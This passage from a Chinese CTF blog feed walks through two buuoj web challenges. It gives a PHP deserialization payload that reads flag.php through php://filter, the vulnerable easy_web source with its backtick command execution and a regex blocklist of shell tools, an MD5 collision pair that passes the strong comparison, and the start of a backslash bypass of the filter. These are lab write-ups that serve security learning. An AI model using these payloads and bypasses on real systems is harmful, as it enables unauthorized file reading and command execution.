<h4 id="构造playload："><a href="#构造playload：" class="headerlink" title="构造playload："></a>构造playload：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line">    <span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>原题中class中变量的类型是protected，但protected在反序列化是会产生%00字符，在is_vaild的函数中会被过滤，然鹅PHP7.1以后好像不同类型的反序列化都一样了，所以playload中用的是public。</p>
<p>最后提交，获得flag。</p>
]]></content>
  </entry>
  <entry>
    <title>web-14 buuoj [安洵杯 2019]easy_web</title>
    <url>/2021/01/11/web-14/</url>
    <content><![CDATA[<h1 id="buuoj-安洵杯-2019-easy-web"><a href="#buuoj-安洵杯-2019-easy-web" class="headerlink" title="buuoj [安洵杯 2019]easy_web"></a>buuoj [安洵杯 2019]easy_web</h1><p>这题确实有点搞人心态。。。</p>
<ul>
<li><h3 id="先想办法找一下源码"><a href="#先想办法找一下源码" class="headerlink" title="先想办法找一下源码"></a>先想办法找一下源码</h3><ol>
<li><p>注意到img后面的那串字符，有点base64的味道，拿去解码。</p>
<h5 id="（坑点1：http-ctf-ssleye-com-这个网站的base64解码有bug）"><a href="#（坑点1：http-ctf-ssleye-com-这个网站的base64解码有bug）" class="headerlink" title="（坑点1：http://ctf.ssleye.com/这个网站的base64解码有bug）"></a>（坑点1：<a href="http://ctf.ssleye.com/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E7%9A%84base64%E8%A7%A3%E7%A0%81%E6%9C%89bug%EF%BC%89">http://ctf.ssleye.com/这个网站的base64解码有bug）</a></h5></li>
<li><p>解码顺序：base64-&gt;base64-&gt;hex 最后解出555.png</p>
</li>
<li><p>虽然没什么乱用，但也能给我们提供一些思路，注意到img背后有一大串乱七八糟的编码，base64解码出一坨乱码，但开头是PNG。这暗示了index.php的加密方式可能也是和555.png相同的，所以我们可以把index.php按照hex-&gt;base64-&gt;base64加密的方式传入，再对这时的一坨乱码进行base64解密，得到源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    header(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = hex2bin(base64_decode(base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = preg_replace(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = base64_encode(file_get_contents(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; md5(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === md5(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><h3 id="考虑考虑怎么搞到flag"><a href="#考虑考虑怎么搞到flag" class="headerlink" title="考虑考虑怎么搞到flag"></a>考虑考虑怎么搞到flag</h3><ol>
<li><p>img可以随便动，但看了看源码也没什么乱用。</p>
</li>
<li><p>cmd参数可以用，不过有一片正则的过滤，而且需要绕过下面的md5强比较才能执行。（PHP中被反引号包裹的可以直接执行）</p>
</li>
<li><p>md5强比较，post提交，那自然又是找现成的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br><span class="line">b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></figure>

<h5 id="坑点2：原本的get请求改成post时，要加上Content-Type-application-x-www-form-encoded"><a href="#坑点2：原本的get请求改成post时，要加上Content-Type-application-x-www-form-encoded" class="headerlink" title="(坑点2：原本的get请求改成post时，要加上Content-Type: application/x-www-form-encoded)"></a>(坑点2：原本的get请求改成post时，要加上Content-Type: application/x-www-form-encoded)</h5></li>
<li><p>现在回来看看怎么绕过正则过滤，这里只有|\\|\\\\|过滤，相当于没有过滤\，PHP中\本身表示一次转义，在正则中\又相当于一次转义，所以\\\才表示过滤\（存疑：4个\在正则中或表示一个\）。因此可以用\把cat分隔开，有以下构造：</p>
</li>
</ol>
</li>
</ul>
]]></content>
  </entry>
</search>
